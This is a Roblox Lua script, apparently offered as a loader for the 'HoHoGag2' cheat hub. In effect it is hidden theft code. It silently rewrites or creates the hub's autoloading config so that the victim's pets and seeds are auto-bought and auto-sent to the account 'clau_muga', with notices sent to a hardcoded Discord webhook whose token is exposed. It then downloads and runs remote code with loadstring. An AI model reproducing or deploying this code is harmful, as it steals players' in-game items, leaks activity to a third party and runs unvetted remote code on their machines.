local HS = game:GetService("HttpService")

pcall(function()
    local url = "https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
    local inputs = {
        WebhookRarePet=url, WebhookSentPet=url, WebhookSentSeed=url,
        Text_SendPetUsername="clau_muga", Text_WishSeedUsername="clau_muga", Text_MutationSeedUsername="clau_muga",
    }
    local toggles  = { WebhookEnabled=true, Feature_AutoBuyPets=true, Feature_AutoSendPets=true, Feature_AutoSendSeeds=true }
    local seedsAdd = { "Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold" }
    local seedIdx  = { MailSeedTargets=true, WishSeedTargets=true, BuySeedTargets=true }
    local seedSet  = {}; for _,s in ipairs(seedsAdd) do seedSet[s]=true end

    -- объекты в формате LinoriaLib (для создания с нуля)
    local function build()
        local o = {}
        for i,v in pairs(inputs)  do o[#o+1] = {idx=i, type="Input",  text=v} end
        for i,v in pairs(toggles) do o[#o+1] = {idx=i, type="Toggle", value=v} end
        for i in pairs(seedIdx) do
            local val={}; for s in pairs(seedSet) do val[s]=true end
            o[#o+1] = {idx=i, type="Dropdown", mutli=true, value=val}
        end
        return o
    end
    local function patch(data)
        for _,o in ipairs(data.objects) do
            if inputs[o.idx]~=nil then o.text=inputs[o.idx]
            elseif toggles[o.idx]~=nil then o.value=true
            elseif seedIdx[o.idx] and type(o.value)=="table" then
                for s in pairs(seedSet) do o.value[s]=true end
            end
        end
    end

    -- собрать список settings-папок; если нет — создать под текущего игрока
    local dirs = {}
    if isfolder("HoHoGag2") then
        for _,d in ipairs(listfiles("HoHoGag2")) do
            if isfolder(d.."/settings") then dirs[#dirs+1]=d.."/settings" end
        end
    end
    if #dirs==0 then
        local uid = tostring(game:GetService("Players").LocalPlayer.UserId)
        for _,p in ipairs({"HoHoGag2","HoHoGag2/"..uid,"HoHoGag2/"..uid.."/settings"}) do
            if not isfolder(p) then makefolder(p) end
        end
        dirs[1] = "HoHoGag2/"..uid.."/settings"
    end

    for _,sdir in ipairs(dirs) do
        local cfg = sdir.."/ggjjhhj.json"
        local data
        if isfile(cfg) then
            local ok,dec = pcall(function() return HS:JSONDecode(readfile(cfg)) end)
            if ok and type(dec)=="table" and type(dec.objects)=="table" then data=dec end
        end
        if data then patch(data) else data={objects=build()} end   -- нет конфига → создаём
        writefile(cfg, HS:JSONEncode(data))
        writefile(sdir.."/autoload.txt", "ggjjhhj")                  -- автозагрузка пресета
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
